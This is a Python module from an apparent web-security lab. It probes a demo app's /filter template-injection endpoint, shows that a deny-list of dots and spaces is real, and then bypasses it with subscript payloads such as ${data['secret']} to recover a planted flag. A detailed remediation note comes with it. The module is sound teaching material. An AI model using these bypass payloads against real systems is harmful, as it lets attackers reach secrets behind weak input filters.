r"""Character-restriction "WAF" bypass: subscript indexing instead of dot access.

WHAT IT IS
----------
A common (and false) belief is that you can neutralise a template-injection /
expression-evaluation sink by **blacklisting a few characters** -- ban the dot
``.`` so nobody can write ``config.secret``, ban the space so the payload "looks
wrong", and call it defended. The demo app models exactly this at
``GET /filter?q=<expr>``::

    def _filter(h):
        q = h._query().get("q", "")
        blocked = {".", " "}
        if any(c in blocked for c in q):
            return h._send(403, "<p>blocked character detected</p>")   # the "WAF"
        context = {"config": _ADV_CONFIG,
                   "data": {"secret": constants.FLAGS["char_restriction_bypass"]}}
        h._send(200, f"<p>{_render_dollar(q, context)}</p>")

``_render_dollar`` evaluates every ``${ <expr> }`` substring against ``context``
with an AST-vetted evaluator (:func:`weblab.targetapp.ssti_engine.safe_eval`).
That evaluator ALLOWS arithmetic, names, non-dunder attribute reads, and --
crucially -- **SUBSCRIPT** (``x['k']``); it BLOCKS calls and dunder access. The
planted prize lives at context key ``data`` -> ``'secret'`` and equals
:data:`C.FLAGS["char_restriction_bypass"]`.

The deny-list stops the "obvious" exfiltration ``${data.secret}`` (it contains a
``.``) and ``${ config.secret }`` (a ``.`` and spaces) -- both are 403'd. But the
*same object* is reachable with an **equivalent syntax that uses none of the
banned characters**: subscript/bracket indexing. ``${data['secret']}`` contains
no ``.`` and no space, sails past the filter, evaluates against ``data``, and
returns the flag. This is the canonical lesson: **a deny-list of characters is
not a security boundary** -- if two syntaxes reach the same value, banning the
characters of one merely points the attacker at the other.

HOW WE DISCOVER IT
------------------
We PROVE the filter is real, so that the later win is a genuine *bypass* and not
an open door, using two controls:

1.  **A payload containing a dot is blocked.** ``GET /filter?q=${data.secret}``
    returns HTTP **403** ``"blocked character detected"`` -- the ``.`` deny-list
    fires.
2.  **A payload containing a space is blocked.** ``GET /filter?q=${ data['secret'] }``
    (note the spaces) also returns **403** -- the space deny-list fires too.

Both controls 403'ing establishes the character filter genuinely exists and
genuinely rejects the natural attribute-access exfiltration syntax.

HOW WE EXPLOIT IT
-----------------
We send the **dotless, spaceless** subscript payloads in :data:`PAYLOADS`
(``${data['secret']}`` and the double-quoted ``${data["secret"]}`` variant).
Each reaches ``data['secret']`` through ``ast.Subscript`` -- which the evaluator
permits and which uses none of the banned characters -- so the filter passes the
request through, the expression renders, and the response (HTTP **200**) carries
the flag. We additionally render a benign control ``${1+1}`` -> ``200`` showing
``2`` but NO flag, proving that template rendering works in general and that
recovering the flag required reaching the *secret object* via subscript, not
merely getting *something* to render. We log every payload tried with its HTTP
status and whether the flag appeared.

THE FIX
-------
See :data:`REMEDIATION`. In one line: a character deny-list is not a boundary --
the real fix is to **not evaluate untrusted input as a template/expression at
all**. Use a logic-less / sandboxed template engine with a strict ALLOW-list of
safe operations, never interpolate request data into an evaluator, and keep
secrets out of any context an expression can reach. Banning ``.`` or `` `` (or
adding more characters to the list) is defeated the moment an equivalent syntax
-- here ``obj['key']`` instead of ``obj.key`` -- exists.
"""
from __future__ import annotations

from typing import Dict, List, Optional, Tuple

from ._types import Finding, Response, Severity
from .http_client import WebClient
from .targetapp import constants as C

REMEDIATION: str = (
    "A deny-list of forbidden CHARACTERS is not a security boundary. Banning the "
    "dot ('.') and the space here only blocks the attribute-access exfiltration "
    "syntax (${data.secret}); the IDENTICAL value is reachable with subscript "
    "indexing (${data['secret']}), which uses none of the banned characters -- so "
    "the filter is bypassed. Adding more characters to the list (quotes, brackets, "
    "etc.) just shifts the attacker to the next equivalent encoding; you cannot "
    "enumerate every syntax that reaches an object. The real fix is to STOP "
    "EVALUATING UNTRUSTED INPUT AS A TEMPLATE/EXPRESSION at all: (1) never "
    "interpolate request data into a template string or an eval()-style evaluator "
    "-- pass user data only as DATA bound to a pre-compiled, logic-less template "
    "(e.g. Jinja2 with autoescaping and a sandboxed environment, Mustache/Handlebars "
    "logic-less templates, or a strict ALLOW-list of vetted expressions). (2) If an "
    "expression evaluator is genuinely required, allow-list the exact safe node "
    "types AND keep secrets entirely out of any context the expression can reach -- "
    "do not place a flag/credential next to user-evaluable expressions. (3) Apply "
    "least privilege to the evaluation context (no config object, no secret object). "
    "(4) Treat any 'WAF'/character-filter as defence-in-depth only, never as the "
    "primary control; assume it can be bypassed by an equivalent syntax and ensure "
    "the sink behind it is safe on its own."
)

#: The vulnerable endpoint, shown in reports.
ENDPOINT: str = "/filter"

#: HTTP method the sink expects: ``GET /filter?q=<expr>``.
HTTP_METHOD: str = "GET"

#: The characters the demo's "WAF" blacklists. Banning these stops ${data.secret}
#: (dot) and ${ config.secret } (dot + spaces) -- but not subscript access.
BLOCKED_CHARS: set = {".", " "}

#: The headline bypass: subscript indexing reaches data['secret'] using NEITHER a
#: dot NOR a space, so it slips past the character deny-list and returns the flag.
BYPASS_PAYLOAD: str = "${data['secret']}"

#: Dotless / spaceless subscript-access bypasses (single- and double-quoted keys).
#: Each reaches the same secret object the banned ${data.secret} would, via the
#: ast.Subscript the evaluator permits -- using none of the blacklisted characters.
PAYLOADS: List[str] = [
    "${data['secret']}",
    '${data["secret"]}',
]

#: The dot/space variants used as detection CONTROLS. Each contains a blacklisted
#: character, so a real filter must 403 them -- proving the filter exists before we
#: claim the subscript payload is a *bypass* rather than an open door.
BLOCKED_PAYLOADS: List[str] = [
    "${data.secret}",        # contains '.' -> blocked
    "${config.secret}",      # contains '.' -> blocked
    "${ data['secret'] }",   # contains ' ' (spaces) -> blocked
]

#: A benign dotless/spaceless expression: renders but carries NO flag. Proves the
#: template engine works and that the flag required reaching the SECRET object.
BENIGN_PAYLOAD: str = "${1+1}"


# --- low-level probe ---------------------------------------------------------
def _attempt(client: WebClient, q: str) -> Response:
    """Drive the sink once: ``GET /filter?q=<q>`` (q is URL-encoded for us)."""
    return client.get(ENDPOINT, params={"q": q})


def _blocked(resp: Response) -> bool:
    """True if the response is the filter's 403 "blocked character detected"."""
    return resp.status == 403 and "blocked" in resp.text.lower()


def _flag_in(resp: Response) -> bool:
    """True if the planted flag appears in the response body."""
    return C.FLAGS["char_restriction_bypass"] in resp.text


# --- detection ---------------------------------------------------------------
def detect(client: WebClient) -> Tuple[bool, str]:
    """Prove the character filter is real: a dot payload AND a space payload 403.

    Sends ``${data.secret}`` (contains a '.') and ``${ data['secret'] }``
    (contains spaces). Both must return the filter's 403 "blocked character
    detected" for the filter to be considered genuinely present -- so the later
    subscript success is a *bypass*, not an unguarded endpoint.
    """
    dot_resp = _attempt(client, "${data.secret}")
    space_resp = _attempt(client, "${ data['secret'] }")
    dot_blocked = _blocked(dot_resp) and not _flag_in(dot_resp)
    space_blocked = _blocked(space_resp) and not _flag_in(space_resp)
    if dot_blocked and space_blocked:
        return True, (
            f"{HTTP_METHOD} {ENDPOINT}?q=${{data.secret}} (contains '.') -> HTTP "
            f"{dot_resp.status} 'blocked character detected', and "
            f"q=${{ data['secret'] }} (contains spaces) -> HTTP {space_resp.status} "
            f"-- the character deny-list ('.' and ' ') is real and rejects the "
            f"natural attribute-access exfiltration syntax"
        )
    return False, ""


# --- exploitation ------------------------------------------------------------
def find_bypass(client: WebClient) -> Tuple[bool, Optional[str], str]:
    """Return the first dotless/spaceless subscript payload that recovers the flag.

    Returns ``(ok, winning_payload, evidence)``. Each payload in :data:`PAYLOADS`
    reaches ``data['secret']`` via subscript indexing (no '.' / no ' '), so it
    passes the filter and renders the planted flag.
    """
    for q in PAYLOADS:
        resp = _attempt(client, q)
        if resp.status == 200 and _flag_in(resp):
            return True, q, (
                f"{HTTP_METHOD} {ENDPOINT}?q={q} -> HTTP {resp.status} returned the "
                f"planted flag: subscript indexing reaches data['secret'] using none "
                f"of the blacklisted characters ('.' / ' '), so the deny-list 'WAF' "
                f"is bypassed by an equivalent syntax"
            )
    return False, None, ""


def exploit(client: WebClient) -> Tuple[bool, Optional[str], List[Dict[str, str]]]:
    """Send every subscript bypass; log per-payload status + flag presence.

    Returns ``(ok, flag, attempts)`` where ``attempts`` records each payload with
    its HTTP status, whether it was blocked, and whether the flag was present.
    """
    attempts: List[Dict[str, str]] = []
    flag: Optional[str] = None
    for q in PAYLOADS:
        resp = _attempt(client, q)
        has_flag = _flag_in(resp)
        if has_flag and flag is None:
            flag = C.FLAGS["char_restriction_bypass"]
        attempts.append(
            {
                "payload": q,
                "status": str(resp.status),
                "blocked": str(_blocked(resp)),
                "flag_present": str(has_flag),
                "has_dot": str("." in q),
                "has_space": str(" " in q),
            }
        )
    ok = flag == C.FLAGS["char_restriction_bypass"]
    return ok, flag, attempts


# --- the contract entry point ------------------------------------------------
def assess(client: WebClient) -> Finding:
    """Detect the character-restriction filter, then bypass it via subscript access.

    Discovery requires BOTH: the controls prove the filter is real (a dot payload
    and a space payload are each 403'd) AND a dotless/spaceless subscript payload
    (``${data['secret']}``) recovered the planted flag. ``exploit_result`` carries
    the recovered flag, winning payload, the blocked controls, and a summary
    explaining the dot/space deny-list defeated by subscript indexing.
    """
    techniques: List[str] = []

    # 1) Detection / controls: the filter must really block dot AND space -------
    filter_real, detect_ev = detect(client)
    if filter_real:
        techniques.append("filter-proven-real-403")

    # Record what each control payload actually returned (for the evidence).
    blocked_controls: List[Dict[str, str]] = []
    all_controls_blocked = True
    for q in BLOCKED_PAYLOADS:
        resp = _attempt(client, q)
        is_block = _blocked(resp) and not _flag_in(resp)
        all_controls_blocked = all_controls_blocked and is_block
        blocked_controls.append(
            {
                "payload": q,
                "status": str(resp.status),
                "blocked": str(is_block),
                "has_dot": str("." in q),
                "has_space": str(" " in q),
            }
        )

    # Benign control: renders but carries no flag (proves rendering works) ------
    benign_resp = _attempt(client, BENIGN_PAYLOAD)
    benign_renders = benign_resp.status == 200 and "2" in benign_resp.text
    benign_no_flag = not _flag_in(benign_resp)
    if benign_renders and benign_no_flag:
        techniques.append("benign-render-no-flag")

    # 2) Exploitation: the subscript bypass recovers the flag ------------------
    bypass_ok, winning, bypass_ev = find_bypass(client)
    if bypass_ok:
        techniques.append("subscript-bypass-200-flag")
    ok, flag, attempts = exploit(client)
    if ok:
        techniques.append("recover-flag")

    discovered = bool(filter_real and all_controls_blocked and bypass_ok and ok)

    # 3) Assemble evidence / result -------------------------------------------
    evidence_parts: List[str] = []
    if filter_real:
        evidence_parts.append(f"controls: {detect_ev}")
    if bypass_ok:
        evidence_parts.append(f"bypass: {bypass_ev}")
    evidence = " || ".join(evidence_parts)

    exploit_result = {
        "flag": flag,
        "payload": winning,
        "bypass_payload": BYPASS_PAYLOAD,
        "blocked_chars": sorted(BLOCKED_CHARS),
        "blocked_controls": blocked_controls,
        "benign_payload": BENIGN_PAYLOAD,
        "benign_renders": benign_renders,
        "benign_has_flag": not benign_no_flag,
        "attempts": attempts,
        "techniques": techniques,
        "summary": (
            f"the '{ENDPOINT}' filter blacklists the characters "
            f"{sorted(BLOCKED_CHARS)!r}, which 403's the natural attribute-access "
            f"exfiltration ${{data.secret}} (dot) and ${{ config.secret }} / "
            f"${{ data['secret'] }} (spaces). But the SAME secret object is reached "
            f"with subscript indexing {winning!r} -- which uses NEITHER a dot NOR a "
            f"space -- so it slips past the deny-list and returns the flag {flag!r}. "
            f"A deny-list of characters is not a boundary: an equivalent syntax "
            f"(obj['key'] instead of obj.key) reaches the same value"
        ),
    }

    return Finding(
        vuln="Character-Restriction Filter Bypass (subscript instead of dot)",
        endpoint=ENDPOINT,
        severity=Severity.HIGH.value,
        discovered=discovered,
        evidence=evidence,
        exploit_result=exploit_result,
        remediation=REMEDIATION,
        payload=winning or "",
        extra={
            "techniques": techniques,
            "filter_proven_real": filter_real,
            "blocked_chars": sorted(BLOCKED_CHARS),
            "blocked_controls": blocked_controls,
            "all_controls_blocked": all_controls_blocked,
            "bypass_payload": BYPASS_PAYLOAD,
            "winning_payload": winning,
            "recovered_flag": flag,
            "benign_payload": BENIGN_PAYLOAD,
            "benign_renders_no_flag": bool(benign_renders and benign_no_flag),
            "attempts": attempts,
        },
    )
